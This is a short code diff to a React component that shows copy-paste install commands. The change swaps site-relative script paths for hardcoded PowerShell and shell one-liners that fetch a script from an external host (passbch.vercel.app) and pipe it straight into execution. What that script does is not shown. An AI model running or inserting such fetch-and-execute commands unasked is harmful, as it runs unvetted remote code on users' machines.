@@ -86,7 +86,7 @@ export function Leaderboard({ explorer, onOpen }) {
 }
 
 export function Terminal() {
-  const cmds = [['PowerShell', `irm ${location.origin}/play.ps1 | iex`], ['bash / zsh / VS Code', `curl -fsSL ${location.origin}/play.sh | sh`]];
+  const cmds = [['Windows · PowerShell', 'irm https://passbch.vercel.app | iex'], ['Mac · Linux · VS Code', 'curl -sL passbch.vercel.app | sh']];
   const [c, setC] = useState(null);
   return (
     <div className="card term">
